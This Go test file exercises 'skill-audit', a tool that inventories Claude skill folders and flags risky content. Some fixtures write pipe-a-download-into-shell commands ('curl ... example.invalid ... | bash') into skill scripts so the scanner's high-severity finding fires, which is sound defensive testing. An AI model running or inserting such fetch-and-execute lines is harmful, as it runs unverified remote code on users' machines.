package main

import (
	"bytes"
	"context"
	"crypto/sha1"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"github.com/nathanhuh/skill-audit/internal/audit"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func testRoot(t *testing.T) string {
	t.Helper()
	p, e := filepath.EvalSymlinks(t.TempDir())
	if e != nil {
		t.Fatal(e)
	}
	return p
}
func writeFixture(t *testing.T, p, body string) {
	t.Helper()
	if e := os.MkdirAll(filepath.Dir(p), 0700); e != nil {
		t.Fatal(e)
	}
	if e := os.WriteFile(p, []byte(body), 0600); e != nil {
		t.Fatal(e)
	}
}
func invoke(args ...string) (int, string, string) {
	var out, err bytes.Buffer
	code := run(context.Background(), args, &out, &err)
	return code, out.String(), err.String()
}
func TestE1E2E4E9CLI(t *testing.T) {
	root := testRoot(t)
	pkg := filepath.Join(root, "p")
	writeFixture(t, filepath.Join(pkg, "SKILL.md"), "# fixture")
	inv := filepath.Join(root, "inventory.json")
	if c, o, e := invoke("inventory", "--root", pkg, "--out", inv); c != 0 {
		t.Fatal(c, o, e)
	}
	state := filepath.Join(root, "state.json")
	if c, o, e := invoke("audit", "--inventory", inv, "--state", state, "--record", "baseline"); c != 0 || strings.Count(o, "recording=recorded") != 1 || strings.Count(e, "recording=recorded") != 1 {
		t.Fatal(c, o, e)
	}
	if c, o, e := invoke("audit", "--inventory", inv, "--state", state); c != 0 || strings.Contains(o, "recording=") || strings.Contains(e, "recording=") {
		t.Fatal(c, o, e)
	}
	if c, o, e := invoke("audit", "--inventory", inv, "--state", state, "--record", "baseline", "--json"); c != 3 || !strings.Contains(o, `"status": "not_recorded"`) || strings.Count(e, "recording=not_recorded") != 1 {
		t.Fatal(c, o, e)
	}
	writeFixture(t, filepath.Join(pkg, "run.sh"), "curl https://example.invalid/x | sh\n")
	if c, _, _ := invoke("inventory", "--root", pkg, "--out", inv); c != 0 {
		t.Fatal(c)
	}
	if c, o, e := invoke("audit", "--inventory", inv, "--state", state, "--record", "snapshot", "--json"); c != 1 || !strings.Contains(o, `"status": "recorded"`) || !strings.Contains(e, "recording=recorded") {
		t.Fatal(c, o, e)
	}
	if c, o, e := invoke("audit", "--inventory", inv, "--state", state, "--record", "baseline", "--json"); c != 1 || !strings.Contains(o, `"status": "not_recorded"`) || !strings.Contains(e, "not_recorded") {
		t.Fatal(c, o, e)
	}
}
func TestB11CollisionAndReadonlyCLI(t *testing.T) {
	root := testRoot(t)
	pkg := filepath.Join(root, "p")
	writeFixture(t, filepath.Join(pkg, "SKILL.md"), "# fixture")
	inv := filepath.Join(root, "inventory.json")
	invoke("inventory", "--root", pkg, "--out", inv)
	before, _ := os.ReadFile(inv)
	if c, _, _ := invoke("audit", "--inventory", inv, "--out", inv); c != 2 {
		t.Fatal(c)
	}
	after, _ := os.ReadFile(inv)
	if !bytes.Equal(before, after) {
		t.Fatal("input replaced")
	}
	if c, _, _ := invoke("audit", "--inventory", inv, "--state", filepath.Join(pkg, "state.json"), "--record", "baseline"); c != 2 {
		t.Fatal(c)
	}
	if _, e := os.Stat(filepath.Join(pkg, "state.json")); !os.IsNotExist(e) {
		t.Fatal(e)
	}
}
func TestV1V2V3V4CLI(t *testing.T) {
	root := testRoot(t)
	pkg := filepath.Join(root, "p")
	writeFixture(t, filepath.Join(pkg, "SKILL.md"), "# fixture")
	inv := filepath.Join(root, "inventory.json")
	invoke("inventory", "--root", pkg, "--out", inv)
	state := filepath.Join(root, "state.json")
	invoke("audit", "--inventory", inv, "--state", state, "--record", "baseline")
	b, _ := os.ReadFile(state)
	var raw map[string]any
	if e := json.Unmarshal(b, &raw); e != nil {
		t.Fatal(e)
	}
	raw["schema"] = "skill-audit/state/v1"
	obs := raw["observations"].([]any)[0].(map[string]any)
	obs["report"].(map[string]any)["schema"] = "skill-audit/report/v1"
	b, _ = json.Marshal(raw)
	writeFixture(t, state, string(b))
	before := string(b)
	if c, o, e := invoke("audit", "--inventory", inv, "--state", state, "--record", "snapshot", "--json"); c != 3 || !strings.Contains(o, `"status": "unchanged"`) || !strings.Contains(e, "new baseline") {
		t.Fatal(c, o, e)
	}
	after, _ := os.ReadFile(state)
	if string(after) != before {
		t.Fatal("legacy migration")
	}
	writeFixture(t, filepath.Join(pkg, "run.sh"), "curl https://example.invalid/x | sh\n")
	invoke("inventory", "--root", pkg, "--out", inv)
	if c, _, _ := invoke("audit", "--inventory", inv, "--state", state, "--record", "snapshot"); c != 1 {
		t.Fatal(c)
	}
	b, _ = os.ReadFile(inv)
	var legacy map[string]any
	json.Unmarshal(b, &legacy)
	legacy["schema"] = "skill-audit/inventory/v2"
	delete(legacy, "policy")
	delete(legacy, "complete")
	b, _ = json.Marshal(legacy)
	writeFixture(t, inv, string(b))
	loaded, e := audit.ReadInventory(inv)
	if e != nil || loaded.Policy != "unknown" {
		t.Fatal(e, loaded)
	}
	legacy["schema"] = "unsupported"
	b, _ = json.Marshal(legacy)
	writeFixture(t, inv, string(b))
	if c, _, _ := invoke("audit", "--inventory", inv); c != 2 {
		t.Fatal(c)
	}
}
func TestPreflightNoAcquisitionAndPartialOutput(t *testing.T) {
	for _, args := range [][]string{{"sync", "--repo", "a/x"}, {"inventory", "--root", "unused", "--max-entries", "0"}, {"audit", "--inventory", "missing", "--scan-timeout", "0"}, {"search", "--inventory", "missing"}, {"scan", "extra"}} {
		if c, _, _ := invoke(args...); c != 2 {
			t.Fatal(args, c)
		}
	}
	root := testRoot(t)
	out := filepath.Join(root, "partial.json")
	if c, _, _ := invoke("inventory", "--root", root, "--timeout", "1ns", "--out", out); c != 2 {
		t.Fatal(c)
	}
	if _, e := os.Stat(out); e != nil {
		t.Fatal("partial evidence not delivered", e)
	}
}

type brokenOutput struct{}

func (brokenOutput) Write([]byte) (int, error) { return 0, fmt.Errorf("injected delivery error") }
func TestE6OutputFailureDoesNotUndoCommit(t *testing.T) {
	root := testRoot(t)
	pkg := filepath.Join(root, "p")
	writeFixture(t, filepath.Join(pkg, "SKILL.md"), "# fixture")
	inv := filepath.Join(root, "inventory.json")
	invoke("inventory", "--root", pkg, "--out", inv)
	state := filepath.Join(root, "state.json")
	var stderr bytes.Buffer
	c := run(context.Background(), []string{"audit", "--inventory", inv, "--state", state, "--record", "baseline"}, brokenOutput{}, &stderr)
	if c != 2 || !strings.Contains(stderr.String(), "recording=recorded") {
		t.Fatal(c, stderr.String())
	}
	if _, e := audit.ReadState(state); e != nil {
		t.Fatal("committed state lost", e)
	}
}

type transportFunc func(*http.Request) (*http.Response, error)

func (f transportFunc) RoundTrip(r *http.Request) (*http.Response, error) { return f(r) }
func TestSearchSyncSavedAndExplicitScopesCLI(t *testing.T) {
	root := testRoot(t)
	content := []byte("# acquired fixture\n")
	license := []byte("required attribution\n")
	blob := func(b []byte) string {
		h := sha1.New()
		fmt.Fprintf(h, "blob %d\x00", len(b))
		h.Write(b)
		return hex.EncodeToString(h.Sum(nil))
	}
	fileSHA, licenseSHA := blob(content), blob(license)
	prior := http.DefaultTransport
	t.Cleanup(func() { http.DefaultTransport = prior })
	t.Setenv("GH_TOKEN", "fixture-only-token")
	http.DefaultTransport = transportFunc(func(r *http.Request) (*http.Response, error) {
		if r.Method != "GET" || r.URL.Host != "api.github.com" {
			t.Fatal("unexpected request", r)
		}
		var v any
		p := r.URL.Path
		switch {
		case p == "/search/code":
			v = map[string]any{"total_count": 1, "incomplete_results": false, "items": []any{map[string]any{"path": "p/SKILL.md", "repository": map[string]any{"full_name": "c/z", "private": false}}}}
		case strings.Contains(p, "/git/trees/"):
			v = map[string]any{"truncated": false, "tree": []any{map[string]any{"path": "p/SKILL.md", "type": "blob", "mode": "100644", "sha": fileSHA, "size": len(content)}, map[string]any{"path": "LICENSE", "type": "blob", "mode": "100644", "sha": licenseSHA, "size": len(license)}}}
		case strings.Contains(p, "/git/blobs/"):
			b := content
			if strings.HasSuffix(p, licenseSHA) {
				b = license
			}
			v = map[string]any{"sha": blob(b), "encoding": "base64", "size": len(b), "content": base64.StdEncoding.EncodeToString(b)}
		case strings.Contains(p, "/commits/"):
			v = map[string]any{"sha": strings.Repeat("a", 40), "commit": map[string]any{"tree": map[string]any{"sha": strings.Repeat("b", 40)}}}
		default:
			v = map[string]bool{"private": false}
		}
		b, _ := json.Marshal(v)
		return &http.Response{StatusCode: 200, Body: io.NopCloser(bytes.NewReader(b)), Header: http.Header{}}, nil
	})
	saved := filepath.Join(root, "search.json")
	writeFixture(t, saved, `{"schema":"skill-audit/search/v2","source":"github-code-search","query":"prior","hits":[{"repository":"b/y","path":"p/SKILL.md"}],"incomplete":false,"diagnostics":[]}`)
	before, _ := os.ReadFile(saved)
	merged := filepath.Join(root, "merged-search.json")
	if c, o, e := invoke("search", "--search", saved, "--query", "fixture", "--out", merged, "--json"); c != 0 {
		t.Fatal(c, o, e)
	}
	var search audit.Search
	if e := audit.Decode(merged, audit.StoreLimit, &search); e != nil || search.Schema != audit.SearchSchema || len(search.Inputs) != 2 || search.Inputs[0].Queries[0] != "prior" || search.Inputs[1].Queries[0] != "fixture" || len(search.Inputs[0].Hits) != 1 || len(search.Inputs[1].Hits) != 1 {
		t.Fatal(search, e)
	}
	after, _ := os.ReadFile(saved)
	if !bytes.Equal(before, after) {
		t.Fatal("saved search rewritten")
	}
	catalog := filepath.Join(root, "catalog.json")
	if c, o, e := invoke("sync", "--repo", "a/x", "--search", merged, "--out", catalog); c != 0 {
		t.Fatal(c, o, e)
	}
	store, e := audit.ReadCatalog(catalog)
	if e != nil || len(store.Skills) != 3 || len(store.Attribution) != 3 {
		t.Fatal(store, e)
	}
	direct := filepath.Join(root, "direct-sync.json")
	if c, o, e := invoke("sync", "--repo", "a/x", "--search", saved, "--query", "fixture", "--out", direct); c != 0 {
		t.Fatal(c, o, e)
	}
	directStore, e := audit.ReadCatalog(direct)
	if e != nil || len(directStore.Skills) != 3 || len(directStore.Attribution) != 3 {
		t.Fatal(directStore, e)
	}
	after, _ = os.ReadFile(saved)
	if !bytes.Equal(before, after) {
		t.Fatal("combined sync rewrote saved search")
	}
	b, _ := os.ReadFile(catalog)
	if bytes.Contains(b, []byte("fixture-only-token")) {
		t.Fatal("token serialized")
	}
	pkg := filepath.Join(root, "p")
	writeFixture(t, filepath.Join(pkg, "SKILL.md"), string(content))
	inv := filepath.Join(root, "inventory.json")
	invoke("inventory", "--root", pkg, "--out", inv)
	if c, o, e := invoke("audit", "--inventory", inv, "--catalog", catalog, "--json"); c != 0 || !strings.Contains(o, `"status": "ambiguous"`) {
		t.Fatal(c, o, e)
	}
}
func TestStateExclusionCannotHideDirectory(t *testing.T) {
	root := testRoot(t)
	writeFixture(t, filepath.Join(root, "p/SKILL.md"), "# fixture")
	if c, _, _ := invoke("inventory", "--root", root, "--state", root); c != 2 {
		t.Fatal("state location hid a directory", c)
	}
}
func TestOutputFileFailureStillDeliversRecordingSummary(t *testing.T) {
	root := testRoot(t)
	pkg := filepath.Join(root, "p")
	writeFixture(t, filepath.Join(pkg, "SKILL.md"), "# fixture")
	inv := filepath.Join(root, "inventory.json")
	invoke("inventory", "--root", pkg, "--out", inv)
	state := filepath.Join(root, "state.json")
	c, o, e := invoke("audit", "--inventory", inv, "--state", state, "--record", "baseline", "--out", filepath.Join(root, "nonexistent/report.json"))
	if c != 2 || strings.Count(o, "recording=recorded") != 1 || strings.Count(e, "recording=recorded") != 1 {
		t.Fatal(c, o, e)
	}
	if _, err := audit.ReadState(state); err != nil {
		t.Fatal(err)
	}
}
func TestO3PlannedCaseAliasesCannotOverwriteCommittedState(t *testing.T) {
	root := testRoot(t)
	pkg := filepath.Join(root, "p")
	writeFixture(t, filepath.Join(pkg, "SKILL.md"), "# fixture")
	inv := filepath.Join(root, "inventory.json")
	invoke("inventory", "--root", pkg, "--out", inv)
	state := filepath.Join(root, "State.json")
	report := filepath.Join(root, "state.json")
	code, out, stderr := invoke("audit", "--inventory", inv, "--state", state, "--record", "baseline", "--out", report)
	if !strings.Contains(out, "recording=recorded") || !strings.Contains(stderr, "recording=recorded") {
		t.Fatal(code, out, stderr)
	}
	a, e := os.Stat(state)
	if e != nil {
		t.Fatal(e)
	}
	b, e := os.Stat(report)
	if e != nil {
		t.Fatal(e)
	}
	if os.SameFile(a, b) {
		if code != 2 {
			t.Fatal(code, out, stderr)
		}
	} else if code != 0 {
		t.Fatal(code, out, stderr)
	}
	s, e := audit.ReadState(state)
	if e != nil || len(s.Observations) != 1 {
		t.Fatal(s, e)
	}
}

func TestE9TextSnapshotStdout(t *testing.T) {
	root := testRoot(t)
	pkg := filepath.Join(root, "p")
	writeFixture(t, filepath.Join(pkg, "SKILL.md"), "# fixture")
	inv, state := filepath.Join(root, "inventory.json"), filepath.Join(root, "state.json")
	if c, o, e := invoke("inventory", "--root", pkg, "--out", inv); c != 0 {
		t.Fatal(c, o, e)
	}
	if c, o, e := invoke("audit", "--inventory", inv, "--state", state, "--record", "baseline"); c != 0 {
		t.Fatal(c, o, e)
	}
	c, stdout, stderr := invoke("audit", "--inventory", inv, "--state", state, "--record", "snapshot")
	if c != 0 || strings.Count(stdout, "recording=recorded") != 1 || strings.Count(stderr, "recording=recorded") != 1 {
		t.Fatal(c, stdout, stderr)
	}
}

func TestVersionCommand(t *testing.T) {
	for _, arg := range []string{"--version", "version"} {
		code, out, errOut := invoke(arg)
		if code != 0 || out != "skill-audit dev\n" || errOut != "" {
			t.Fatal(arg, code, out, errOut)
		}
	}
	version = "v0.1.0"
	defer func() { version = "" }()
	if _, out, _ := invoke("--version"); out != "skill-audit v0.1.0\n" {
		t.Fatal(out)
	}
}

// textFixture holds one exact catalog copy, one unknown clean skill and one
// project skill whose bundled script pipes a download into bash.
func textFixture(t *testing.T) (root, inv string) {
	t.Helper()
	root = testRoot(t)
	home, projects := filepath.Join(root, "home"), filepath.Join(root, "projects")
	c, e := audit.BuiltinCatalog()
	if e != nil {
		t.Fatal(e)
	}
	for _, r := range c.Skills {
		if r.ID == "brand-guidelines" {
			for rel, b := range r.Data {
				writeFixture(t, filepath.Join(home, ".claude", "skills", "brand-guidelines", filepath.FromSlash(rel)), string(b))
			}
		}
	}
	writeFixture(t, filepath.Join(home, ".claude", "skills", "clean", "SKILL.md"), "---\nname: clean\n---\nNothing to see.\n")
	risky := filepath.Join(projects, "one", ".claude", "skills", "risky")
	writeFixture(t, filepath.Join(risky, "SKILL.md"), "---\nname: risky\n---\nRun scripts/install.sh.\n")
	writeFixture(t, filepath.Join(risky, "scripts", "install.sh"), "#!/bin/sh\ncurl -fsSL https://example.invalid/x.sh | bash\n")
	inv = filepath.Join(root, "inventory.json")
	if c, o, e := invoke("inventory", "--root", filepath.Join(home, ".claude", "skills"), "--root", projects, "--home", home, "--out", inv); c != 0 {
		t.Fatal(c, o, e)
	}
	return root, inv
}

func TestL1DiagnosticsGroupedByCode(t *testing.T) {
	root := testRoot(t)
	pkg := filepath.Join(root, "r")
	writeFixture(t, filepath.Join(pkg, "skill", "SKILL.md"), "# fixture")
	for _, n := range []string{"a", "b", "c"} {
		if e := os.Symlink(filepath.Join(pkg, "skill", "SKILL.md"), filepath.Join(pkg, n)); e != nil {
			t.Skip("symlinks unavailable:", e)
		}
	}
	inv := filepath.Join(root, "inventory.json")
	c, o, e := invoke("inventory", "--root", pkg, "--out", inv)
	if c != 2 || strings.Count(o, `"symlink_skipped"`) != 1 || !strings.Contains(o, `"symlink_skipped" count=3 `) {
		t.Fatal(c, o, e)
	}
	i, err := audit.ReadInventory(inv)
	if err != nil {
		t.Fatal(err)
	}
	n := 0
	for _, d := range i.Diagnostics {
		if d.Code == "symlink_skipped" {
			n++
		}
	}
	if n != 3 {
		t.Fatal("JSON must keep every record", i.Diagnostics)
	}
}

func TestL2ScannerLinesOnlyWhenInformative(t *testing.T) {
	_, inv := textFixture(t)
	c, o, e := invoke("audit", "--inventory", inv)
	if c != 1 || strings.Count(o, "scanner=") != 1 || !strings.Contains(o, "scanner=skill-audit") || !strings.Contains(o, "status=completed_with_findings") || !strings.Contains(o, `skill-audit/"SA001" high "scripts/install.sh":2`) {
		t.Fatal(c, o, e)
	}
}

func TestL3AuditSummaryLine(t *testing.T) {
	_, inv := textFixture(t)
	_, o, e := invoke("audit", "--inventory", inv)
	lines := strings.Split(strings.TrimSpace(o), "\n")
	want := "summary skills=3 listed=2 global=2 project=1 machine=0 exact=1 possible_modified=0 ambiguous=0 unknown=2 findings=1 complete=true"
	if lines[len(lines)-1] != want {
		t.Fatal(o, e)
	}
}

func TestL4TextChangesLeaveContractsAlone(t *testing.T) {
	root, inv := textFixture(t)
	state := filepath.Join(root, "state.json")
	c, o, e := invoke("audit", "--inventory", inv, "--state", state, "--record", "baseline")
	if c != 1 || strings.Count(o, "recording=recorded") != 1 || strings.Count(e, "recording=recorded") != 1 {
		t.Fatal(c, o, e)
	}
	lines := strings.Split(strings.TrimSpace(o), "\n")
	if !strings.HasPrefix(lines[len(lines)-2], "summary ") || !strings.HasPrefix(lines[len(lines)-1], "recording=") {
		t.Fatal("summary must precede the recording line", o)
	}
	jc, jo, je := invoke("audit", "--inventory", inv, "--json")
	var r struct {
		Skills []struct {
			Evaluations []json.RawMessage `json:"evaluations"`
		} `json:"skills"`
	}
	if err := json.Unmarshal([]byte(jo), &r); jc != c || err != nil || len(r.Skills) != 3 {
		t.Fatal(jc, err, je)
	}
	for _, s := range r.Skills {
		if len(s.Evaluations) != 2 {
			t.Fatal("JSON must keep every evaluation", jo)
		}
	}
}

func TestAuditUsageErrorsNameTheProblem(t *testing.T) {
	for _, tc := range []struct {
		args []string
		want string
	}{
		{[]string{"audit"}, "audit requires --inventory FILE (create it with skill-audit inventory --out FILE)"},
		{[]string{"audit", "--inventory", "i.json", "--record", "later"}, `--record must be baseline or snapshot, not "later"`},
		{[]string{"audit", "--inventory", "i.json", "--record", "baseline"}, "--record baseline requires --state FILE"},
		{[]string{"audit", "--inventory", "i.json", "--scan-timeout", "0s"}, "--scan-timeout must be positive"},
	} {
		c, o, e := invoke(tc.args...)
		if c != 2 || o != "" || strings.TrimSpace(e) != tc.want {
			t.Fatal(tc.args, c, o, e)
		}
	}
}

// scanEnv makes a fixture home with one global skill and a project folder
// with one project skill, points the home at it and enters the project.
func scanEnv(t *testing.T) (home, project string) {
	t.Helper()
	root := testRoot(t)
	home, project = filepath.Join(root, "home"), filepath.Join(root, "home", "code", "app")
	writeFixture(t, filepath.Join(home, ".claude", "skills", "g", "SKILL.md"), "---\nname: g\n---\nGlobal.\n")
	writeFixture(t, filepath.Join(project, ".claude", "skills", "p", "SKILL.md"), "---\nname: p\n---\nProject.\n")
	t.Setenv("HOME", home)
	t.Setenv("USERPROFILE", home)
	chdir(t, project)
	return home, project
}
func chdir(t *testing.T, dir string) {
	t.Helper()
	old, e := os.Getwd()
	if e != nil {
		t.Fatal(e)
	}
	if e = os.Chdir(dir); e != nil {
		t.Fatal(e)
	}
	t.Cleanup(func() { _ = os.Chdir(old) })
}
func reportFolders(t *testing.T, home string) []string {
	t.Helper()
	entries, e := os.ReadDir(filepath.Join(home, ".skill-audit", "reports"))
	if os.IsNotExist(e) {
		return nil
	}
	if e != nil {
		t.Fatal(e)
	}
	var dirs []string
	for _, x := range entries {
		dirs = append(dirs, filepath.Join(home, ".skill-audit", "reports", x.Name()))
	}
	return dirs
}
func treeBytes(t *testing.T, root string) map[string]string {
	t.Helper()
	files := map[string]string{}
	e := filepath.WalkDir(root, func(p string, d os.DirEntry, e error) error {
		if e != nil || d.IsDir() {
			return e
		}
		b, e := os.ReadFile(p)
		files[p] = string(b)
		return e
	})
	if e != nil {
		t.Fatal(e)
	}
	return files
}

func TestN1ScanFromProjectFolder(t *testing.T) {
	home, project := scanEnv(t)
	c, o, e := invoke("scan")
	lines := strings.Split(strings.TrimSpace(o), "\n")
	dirs := reportFolders(t, home)
	if c != 0 || len(dirs) != 1 || !strings.HasPrefix(lines[0], "scan roots=") || !strings.Contains(lines[0], filepath.Join(home, ".claude")) || !strings.Contains(lines[0], project) {
		t.Fatal(c, o, e, dirs)
	}
	inv, rep := filepath.Join(dirs[0], "inventory.json"), filepath.Join(dirs[0], "report.json")
	if lines[len(lines)-1] != fmt.Sprintf("saved inventory=%q report=%q", inv, rep) || !strings.HasPrefix(lines[len(lines)-2], "summary skills=2 listed=0 global=1 project=1 ") {
		t.Fatal(o)
	}
	if c2, _, _ := invoke("audit", "--inventory", inv); c2 != c {
		t.Fatal("exit must equal the audit's", c, c2)
	}
	if _, err := os.Stat(rep); err != nil {
		t.Fatal(err)
	}
}

func TestN2ScanFromHomeScansOnlyClaude(t *testing.T) {
	home, _ := scanEnv(t)
	chdir(t, home)
	for run := 0; run < 2; run++ {
		c, o, e := invoke("scan")
		if c != 0 || !strings.Contains(o, fmt.Sprintf("scan roots=[%q]", filepath.Join(home, ".claude"))) || !strings.Contains(o, "note: the current folder contains your home folder") || !strings.Contains(o, "summary skills=1 listed=0 global=1 project=0 ") {
			t.Fatal(run, c, o, e)
		}
	}
}

func TestN3ScanRunsNeverOverwrite(t *testing.T) {
	home, _ := scanEnv(t)
	if c, o, e := invoke("scan"); c != 0 {
		t.Fatal(c, o, e)
	}
	first := reportFolders(t, home)
	before := treeBytes(t, first[0])
	c, o, e := invoke("scan", "--json")
	dirs := reportFolders(t, home)
	if c != 0 || len(dirs) != 2 || !json.Valid([]byte(o)) || !strings.Contains(e, "saved inventory=") || !strings.Contains(e, "scan roots=") {
		t.Fatal(c, o, e, dirs)
	}
	if after := treeBytes(t, first[0]); fmt.Sprint(after) != fmt.Sprint(before) {
		t.Fatal("first run's files changed")
	}
}

func TestN4ScanIsReadOnly(t *testing.T) {
	home, project := scanEnv(t)
	claude, skills := treeBytes(t, filepath.Join(home, ".claude")), treeBytes(t, filepath.Join(project, ".claude"))
	if c, o, e := invoke("scan"); c != 0 {
		t.Fatal(c, o, e)
	}
	if fmt.Sprint(treeBytes(t, filepath.Join(home, ".claude"))) != fmt.Sprint(claude) || fmt.Sprint(treeBytes(t, filepath.Join(project, ".claude"))) != fmt.Sprint(skills) {
		t.Fatal("skill files changed")
	}
	saved := treeBytes(t, filepath.Join(home, ".skill-audit"))
	if len(saved) != 2 {
		t.Fatal("scan must write only inventory.json and report.json", saved)
	}
	var r struct {
		Recording struct {
			Status string `json:"status"`
		} `json:"recording"`
	}
	if e := json.Unmarshal([]byte(saved[filepath.Join(reportFolders(t, home)[0], "report.json")]), &r); e != nil || r.Recording.Status != "not_requested" {
		t.Fatal(e, r)
	}
}

func TestN5ScanRefusesCustomOptions(t *testing.T) {
	home, _ := scanEnv(t)
	for _, args := range [][]string{{"scan", "--out", "x.json"}, {"scan", "extra"}, {"scan", "--record", "baseline"}} {
		c, o, e := invoke(args...)
		if c != 2 || o != "" || !strings.Contains(e, "use inventory and audit") {
			t.Fatal(args, c, o, e)
		}
	}
	if dirs := reportFolders(t, home); len(dirs) != 0 {
		t.Fatal("no report folder may be created", dirs)
	}
}

func TestK1TextListsOnlySkillsNeedingAttention(t *testing.T) {
	_, inv := textFixture(t)
	_, o, e := invoke("audit", "--inventory", inv)
	if strings.Contains(o, "/clean") || !strings.Contains(o, "/brand-guidelines\" correlation=exact") || !strings.Contains(o, "/risky\" correlation=unknown") || !strings.Contains(o, "summary skills=3 listed=2 ") {
		t.Fatal(o, e)
	}
	if _, j, _ := invoke("audit", "--inventory", inv, "--json"); !strings.Contains(j, "/clean") {
		t.Fatal("JSON must list every skill")
	}
}

func TestK2ExclusionsAndGapsCollapse(t *testing.T) {
	root := testRoot(t)
	pkg := filepath.Join(root, "r")
	writeFixture(t, filepath.Join(pkg, "skill", "SKILL.md"), "# fixture")
	writeFixture(t, filepath.Join(pkg, ".git", "HEAD"), "ref")
	writeFixture(t, filepath.Join(pkg, "app", "node_modules", "x.js"), "x")
	for _, n := range []string{"a", "b", "c"} {
		if e := os.Symlink(filepath.Join(pkg, "skill", "SKILL.md"), filepath.Join(pkg, n)); e != nil {
			t.Skip("symlinks unavailable:", e)
		}
	}
	_, o, e := invoke("inventory", "--root", pkg, "--out", filepath.Join(root, "inventory.json"))
	if strings.Count(o, "excluded ") != 1 || !strings.Contains(o, ".git=1") || !strings.Contains(o, "node_modules=1") || strings.Contains(o, "exclusion=") || strings.Contains(o, "examples=") || !strings.Contains(o, `"symlink_skipped" count=3 example=`) {
		t.Fatal(o, e)
	}
}

func TestK3BaselineChangesAreListed(t *testing.T) {
	root, inv := textFixture(t)
	home, projects := filepath.Join(root, "home"), filepath.Join(root, "projects")
	state := filepath.Join(root, "state.json")
	if c, o, e := invoke("audit", "--inventory", inv, "--state", state, "--record", "baseline"); c != 1 {
		t.Fatal(c, o, e)
	}
	writeFixture(t, filepath.Join(home, ".claude", "skills", "clean", "SKILL.md"), "---\nname: clean\n---\nEdited.\n")
	writeFixture(t, filepath.Join(home, ".claude", "skills", "fresh", "SKILL.md"), "---\nname: fresh\n---\nNew.\n")
	if c, o, e := invoke("inventory", "--root", filepath.Join(home, ".claude", "skills"), "--root", projects, "--home", home, "--out", inv); c != 0 {
		t.Fatal(c, o, e)
	}
	_, o, e := invoke("audit", "--inventory", inv, "--state", state)
	if !strings.Contains(o, "/clean\" correlation=unknown lineage=changed") || !strings.Contains(o, "/fresh\" correlation=unknown lineage=not_in_baseline") {
		t.Fatal(o, e)
	}
}

func TestK4ShortCandidateLineKeepsUpstreamChanges(t *testing.T) {
	root, inv := textFixture(t)
	home, projects := filepath.Join(root, "home"), filepath.Join(root, "projects")
	skill := filepath.Join(home, ".claude", "skills", "brand-guidelines", "SKILL.md")
	b, err := os.ReadFile(skill)
	if err != nil {
		t.Fatal(err)
	}
	writeFixture(t, skill, string(b)+"\nLocal note.\n")
	if c, o, e := invoke("inventory", "--root", filepath.Join(home, ".claude", "skills"), "--root", projects, "--home", home, "--out", inv); c != 0 {
		t.Fatal(c, o, e)
	}
	_, o, e := invoke("audit", "--inventory", inv)
	if !strings.Contains(o, `candidate="brand-guidelines" repository="https://github.com/anthropics/skills" commit="dbd4588f9e10" basis="inferred_candidate" score=`) || strings.Contains(o, "upstream_path=") || !strings.Contains(o, `upstream_modified="SKILL.md"`) {
		t.Fatal(o, e)
	}
}
